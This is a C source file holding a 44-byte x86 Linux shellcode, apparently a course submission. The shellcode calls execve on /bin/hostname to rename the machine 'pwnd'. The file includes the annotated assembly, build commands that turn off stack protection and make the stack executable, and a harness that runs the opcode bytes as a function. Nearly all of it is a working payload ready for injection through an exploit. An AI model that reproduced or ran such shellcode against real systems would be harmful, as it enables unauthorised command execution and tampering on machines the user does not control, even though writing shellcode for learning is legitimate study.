/*
################## Description ####################

; Title   : /bin/hostname pwnd - Shellcode
; Author  : Hashim Jawad
; Website : ihack4falafel[.]com
; Twitter : @ihack4falafel
; SLAE ID : SLAE-1115
; Purpose : change hostname to pwnd
; OS      : Linux
; Arch    : x86
; Size    : 44 bytes
################### pwnd.nasm #####################

global _start

section .text

_start:

	; push NULL into stack
	xor eax, eax
	push eax

	; push (////bin/hostname) into stack
	push 0x656d616e
	push 0x74736f68
	push 0x2f6e6962
	push 0x2f2f2f2f

	; store ESP pointer in EBX
	mov ebx, esp

	; push NULL into stack and EDX
	push eax
	mov edx, eax

	; push (pwnd) into stack followed by NULL
	push 0x646e7770

	; store ESP pointer in EDI
	mov edi, esp

	; push EBX, EDI, EAX into stack
	push eax
	push edi
	push ebx

	; store ESP pointer in ECX
	mov ecx, esp

	; execute  __NR_execve syscall
	mov al, 0xb
	int 0x80

################### pwnd binary #####################

nasm -f elf32 -o pwnd.o pwnd.nasm

ld -z execstack -o pwnd pwnd.o

################### Shellcode #######################

objdump -d pwnd -M intel

##################  Compile  #######################

gcc -fno-stack-protector -z execstack pwnd.c -o pwnd

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x6e\x61\x6d\x65\x68\x68\x6f\x73\x74\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xc2\x68\x70\x77\x6e\x64\x89\xe7\x50\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
